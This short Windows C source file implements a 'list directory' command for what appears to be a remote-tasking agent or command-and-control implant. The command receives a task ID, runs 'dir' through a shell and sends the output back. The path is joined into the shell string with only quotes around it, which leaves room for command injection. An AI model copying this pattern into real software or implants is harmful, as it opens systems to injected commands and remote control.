#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_LS

void command_ls(char *task_id, char *params) {
  char path[MAX_PATH] = {0};
  if (params[0] == '{') {
    extract_json_string(params, "path", path, sizeof(path));
  } else {
    strncpy(path, params, sizeof(path) - 1);
  }

  char cmd[MAX_PATH + 20] = "dir ";
  // Quote path to handle spaces
  if (strlen(path) > 0) {
    strncat(cmd, "\"", sizeof(cmd) - strlen(cmd) - 1);
    strncat(cmd, path, sizeof(cmd) - strlen(cmd) - 1);
    strncat(cmd, "\"", sizeof(cmd) - strlen(cmd) - 1);
  }

  char *output = execute_shell(cmd);
  send_task_response(task_id, output);
  if (output)
    free(output);
}

#endif
